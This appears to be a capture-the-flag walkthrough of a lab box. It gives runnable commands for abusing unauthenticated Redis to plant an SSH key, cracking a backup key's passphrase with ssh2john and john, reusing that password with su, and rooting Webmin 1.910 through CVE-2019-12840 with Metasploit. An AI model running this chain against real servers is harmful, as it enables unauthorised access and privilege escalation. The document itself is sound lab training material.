

**Chain:** nmap `-p-` → unauthenticated **Redis** → write SSH key via Redis → shell as **redis** → crack a backup SSH key (`ssh2john`+`john`) → `su` to **Matt** (password reuse) → **Webmin 1.910** authenticated RCE → **root**.

> The **"What I learned"** boxes are the real lesson.

---

## Phase 1 — Enumerate (and the mistake that hid the foothold)

Default scan (top-1000 ports only):

```bash
nmap -sC -sV 10.129.2.1
```

Showed: **22** (SSH, OpenSSH 7.6p1), **80** (Apache 2.4.29 — "The Cyber Geek's Personal Website"), **2009** (filtered), **10000** (MiniServ 1.910 = **Webmin**).

I jumped to Webmin on :10000 and tried to log in → got:

```
403 — Access denied for <my IP>. The host has been blocked because of too many authentication failures.
```

What I learned #1 — don't brute-force Webmin; it's NOT the foothold. That 403 is Webmin's built-in brute-force lockout (temporary — clears in minutes, or on reset). Webmin is the privesc step at the END; you log in with real creds found on the box, not by guessing. I jumped to the last step first.

What I learned #2 — ALWAYS run -p-. The default nmap checks only 1000 of 65535 ports, and the real foothold port wasn't in that list. Full scan:

```
nmap -p- --min-rate 5000 10.129.2.1
```

This revealed port 6379 (Redis) — the whole way in, silently skipped by the default scan.

Version-scan the new port:

```bash
nmap -sCV -p 6379 10.129.2.1
```

### Web fuzzing (ffuf) — port 80 and 10000

I fuzzed the web ports to be thorough. **Both came back thin** — expected, because the foothold here is Redis, not the web. (Running them anyway is correct method; empty results just told me the path was elsewhere.)

**Port 80 (Apache) — dirs + extensions:**

```bash
ffuf -u http://10.129.2.1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt -t 50
```

**Port 10000 (Webmin — note `https://`):**

```bash
ffuf -u https://10.129.2.1:10000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

**If flooded with same-size junk, auto-filter it:**

```bash
ffuf -u http://10.129.2.1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ac -t 50
```

**Or see every response to find the junk size, then `-fs <size>`:**

```bash
ffuf -u http://10.129.2.1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -t 50
```

Filter flags: `-fs <size>` hide by size, `-fc 404,403` hide by code, `-fw <n>` by words, `-ac` auto-calibrate. Match with `-mc`. `-e` adds extensions, `-t` threads.

> **Lesson:** fuzzing the web and getting **nothing** isn't failure — on this box it *confirms* the path isn't web. Do it, note the empty result, pivot to the other open ports.

---

## Phase 2 — Redis is unauthenticated (the foothold)

Browser proof — `http://10.129.2.1:6379/` returned `-ERR wrong number of arguments for 'get' command` = Redis **answering**. Connect properly:

```bash
redis-cli -h 10.129.2.1
```
```
10.129.2.1:6379> info
```
Full server info dumped with **no password asked** = **unauthenticated Redis = I own it.**

> **Side note:** I briefly tried the MSF module `auxiliary/scanner/redis/redis_server` but set `RHOSTS` to **my own IP**, so it scanned me and found nothing. `redis-cli` by hand is simpler. Always double-check `RHOSTS` = the TARGET.

---

## Phase 3 — Redis → SSH key write → shell as redis

**Idea:** Redis runs as the **redis** user and can dump its database to **any file redis can write**. I make it write **my SSH public key** into redis's `authorized_keys`, then log in as redis with my private key.

**How SSH key login works:** a key **pair** = private (my secret) + public (safe to share). A user's `~/.ssh/authorized_keys` lists **public keys allowed to log in as that user**. SSH: "prove you hold the private key matching one of these → come in, no password." So I **add my own public key** to the list redis trusts (like adding my fingerprint to the door scanner).

**1. Make a key pair on my box:**

```bash
ssh-keygen -t rsa -f ./postman_key -N ""
```

**2. Pad the public key with blank lines (Redis adds junk around it):**

```bash
(echo -e "\n\n"; cat postman_key.pub; echo -e "\n\n") > key.txt
```

**3. Load it into Redis memory:**

```bash
cat key.txt | redis-cli -h 10.129.2.1 -x set pwn
```

**4. Make Redis save its DB as redis's authorized_keys:**

```bash
redis-cli -h 10.129.2.1
```
```
10.129.2.1:6379> config set dir /var/lib/redis/.ssh
10.129.2.1:6379> config set dbfilename authorized_keys
10.129.2.1:6379> save
```

- `config set dir` = **where** Redis dumps. `config set dbfilename` = the **filename**. `save` = write now. The DB (my key) lands at `/var/lib/redis/.ssh/authorized_keys` (redis's home).

**5. SSH in as redis:**

```bash
ssh -i postman_key redis@10.129.2.1
```

> **What I learned #3 — the pattern "write a file as user X → write an SSH key → become user X."** The unauthenticated Redis is the hole; the key is just how I turn "write a file as redis" into "log in as redis."

---

## Phase 4 — Enumerate as redis → find a backup SSH key

redis is a low-priv **service account** (no user flag yet). Find the real users:

```bash
cat /etc/passwd | grep -vE "nologin|false"
```

Hunt keys + backups redis can read:

```bash
find / -name "id_rsa*" 2>/dev/null
```
```bash
find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*~" \) 2>/dev/null
```

→ found a **backup of Matt's SSH private key** (readable by redis), and also `/var/backups/{passwd,group,shadow,gshadow}.bak`.

**Are the /var/backups files useful?** Mostly no — they're routine system backups:

| File                      | Useful?           | Why                                                                                                                       |
| ------------------------- | ----------------- | ------------------------------------------------------------------------------------------------------------------------- |
| `passwd.bak`, `group.bak` | ❌                 | just usernames/groups, **no hashes**                                                                                      |
| `gshadow.bak`             | ⚠️                | group hashes, rarely useful, usually root-only                                                                            |
| `shadow.bak`              | ✅ **IF readable** | user password hashes — but almost always **root-only** → test `cat /var/backups/shadow.bak`; "Permission denied" = ignore |

> **What I learned #4 — SOMETIMES BACKUP FILES ARE ACCESSIBLE BY ALL, WHERE NOT THE ORGINIAL ONEs. Not every `.bak` is loot; but hunt backups when stuck.** A backup is often the **same secret with weaker permissions** — admins lock down the real `id_rsa` but forget the `.bak` copy. `/var/backups/*` is routine housekeeping (shadow.bak would be gold but is root-locked). The **readable SSH key backup** is the real one — the unlocked window next to the locked door.

---

## Phase 5 — Crack the key → become Matt (password reuse)

The backup key is **encrypted** (`Proc-Type: 4,ENCRYPTED`). Crack its passphrase. **Two tools, two jobs:** `ssh2john` *converts* the key into a hash John understands; `john` *cracks* it.

```bash
ssh2john id_rsa.bak > key.hash
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

→ passphrase = **`computer2008`**.

> **What I learned #5 — the `*2john` family.** `ssh2john` (SSH keys), `keepass2john` (KeePass — used on Jeeves!), `zip2john`/`rar2john`/`7z2john` (archives), `pdf2john`. Rule: encrypted file → run the matching `<format>2john` → feed the hash to john/hashcat. The converter speaks the file's language; John speaks hashes.

**SSH as Matt is DENIED** — the box blocks Matt over SSH, and typing the password at the SSH prompt fails:

```bash
ssh Matt@10.129.2.1   # Permission denied, no matter what
```

**Fix — `su` from inside my existing redis shell** (the passphrase is reused as Matt's system password):

```bash
su Matt
```

(password: `computer2008`)

```bash
id; cat /home/Matt/user.txt
```

> **What I learned #6 — when `ssh user@box` is denied but you already have ANY shell, try `su user`.** `su` uses the system password and ignores sshd's rules, so the SSH block is irrelevant. The cracked passphrase had **two uses**: it unlocks the key AND is Matt's login password (reuse).

### Matt's bash history — the crontab / HTTP-server red herring

After becoming Matt, I read his history:

```bash
cat ~/.bash_history
```
```
wget https://gist.../SimpleHTTPPutServer.py
python SimpleHTTPPutServer.py 8080
mv SimpleHTTPPutServer.py /var/www/html/
apt install apache2
su root
cd /var/www/html
python -m SimpleHTTPServer 8080
service apache2 stop
rm index.html
crontab -e
reboot
```

It **looks** juicy — `crontab -e`, an HTTP PUT server, repeated `su root`. But none of it is exploitable, and here's why I didn't chase it:

- **`crontab -e`** — this edits **Matt's own** crontab, which runs as **Matt**, not root. Editing my own cron gets me nothing I don't already have. (A cron privesc needs a **root** cron job that I can influence — not my own.) I confirmed there's no useful root cron: `cat /etc/crontab; ls -la /etc/cron.d/` showed nothing writable.
- **`SimpleHTTPPutServer` / apache** — Matt was just hosting files during setup. No creds, no SUID, nothing left behind that helps.
- **`su root`** — shows Matt *attempts* to become root, but the history doesn't contain the root password. It's a dead end.

> **What I learned (history triage):** read every history, but **triage** it. Ask of each line: "does this run as a *higher* privilege than me, and can I *influence* it?" `crontab -e` = my own cron = no. An HTTP server = no secret = no. History is for spotting **leaked creds / paths to higher privilege**, not every command the user ever typed. Here it was context, not a path — the real root was Webmin.

---

## Phase 5b — Logrotate? (dead end — and how I knew)

I considered logrotate privesc. Ran the 3-requirement check from my notes:

|#|Requirement|Result|Pass?|
|---|---|---|---|
|1|A log file **I can write**|`find /var/log /tmp -writable -type f 2>/dev/null` → **empty**|❌|
|2|logrotate run by root's cron|`/etc/cron.daily/logrotate` exists|✅|
|3|Vulnerable version|not checked|—|

> **What I learned #7 — check requirements before committing.** Requirement #1 **failed** (no writable log) → logrotate is **out**, full stop (didn't even need to check the version). I checked, saw a NO, and moved on instead of grinding. Also: don't go hunting exotic privesc when a **known root service + valid creds** is sitting right there (Webmin).

---

## Phase 6 — Webmin 1.910 authenticated RCE → root

Webmin runs **as root**, and nmap said **MiniServ 1.910**, which has a known authenticated RCE (**CVE-2019-12840**, the "Package Updates" bug). I now have **Matt / computer2008** (reused for Webmin login).

### How do I KNOW this exploit will work? (3 checks)

1. **Version in range?** nmap = `1.910`; CVE-2019-12840 affects Webmin ≤ 1.910 → ✅. Confirm with searchsploit:

```bash
searchsploit webmin 1.910
```

`searchsploit` searches the local Exploit-DB copy for public exploits matching that product+version. A hit for 1.910 = a real, version-matched exploit exists. (Also: `searchsploit -m <id>` to copy one locally, `searchsploit -x <id>` to read it.)

2. **Auth requirement met?** This is an **authenticated** RCE → needs a valid Webmin login → I have Matt/computer2008 → ✅.
3. **Required feature present?** The user needs the **"Software Package Updates"** module → verify by logging into `https://10.129.2.1:10000` as Matt and seeing it in the menu.

Version in range + valid creds + feature present = "this should work." (Never 100% until you run it — but that's the right confidence level before pulling the trigger.)

### Exploit (Metasploit)

use `use exploit/linux/http/webmin_packageup_rce`

- **`check`** = verify vulnerable WITHOUT exploiting (the in-msf "how do I know"). "appears vulnerable" → `run`.
- **`SSL true`** is required — Webmin on 10000 is **https**; without it the exploit talks plain HTTP and fails.

→ session as **root**:

```bash
id
cat /root/root.txt
```


> **What I learned #8 — vetting ANY exploit before running: match the version, meet the prerequisites, confirm the needed feature/config is present.** This is the opposite of the fake nginx PoC earlier — there nothing matched and it brute-forced nonsense; here every piece lines up. `searchsploit` + the module's `info`/`check` are how you confirm fit.

---

## The chain in one line

`nmap -p-` → unauth **Redis** (6379) → `config set dir/dbfilename`+`save` writes my SSH key → **ssh redis** → find Matt's **`.bak` SSH key** → `ssh2john`+`john` → **`computer2008`** → `su Matt` (SSH blocked, reuse) → **Webmin 1.910** authenticated RCE (CVE-2019-12840) → **root**.

## Takeaways

1. **Always `-p-`** — the foothold (Redis 6379) wasn't in nmap's default 1000.
2. **Unauthenticated Redis = file write as redis** → write an SSH key → shell. Pattern: *write a file as X → become X.*
3. **Hunt backups** when low-priv (`.bak`/`.old`/`~`) — same secret, weaker perms. But `/var/backups/*` is routine (shadow.bak is root-locked).
4. **`ssh2john` converts, `john` cracks** — the whole `*2john` family works this way.
5. **`ssh user@box` denied but you have a shell? → `su user`** — sidesteps sshd rules; cracked passphrases get reused as the password.
6. **Check a technique's requirements before committing** — logrotate failed req #1 (no writable log) → skip. Don't chase exotic privesc when a known root service + creds exists.
7. **Vet exploits: version match + prerequisites met + feature present.** `searchsploit <product> <version>` + msf `check`/`info` confirm fit before you `run`.
